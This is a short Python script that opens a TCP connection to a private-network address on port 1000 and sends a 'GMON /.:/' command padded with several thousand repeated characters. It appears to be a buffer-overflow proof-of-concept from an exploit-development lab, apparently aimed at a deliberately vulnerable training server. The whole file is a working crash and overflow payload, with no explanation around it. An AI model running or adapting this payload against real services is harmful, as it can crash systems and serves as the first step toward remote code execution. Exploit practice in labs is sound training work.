#!/usr/bin/python

import os
import sys
import socket

host="192.168.35.129"
port=1000

pattern="A"*3579 + "B"*2000

buffer = "GMON /.:/" + pattern


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(buffer)
sock.close()
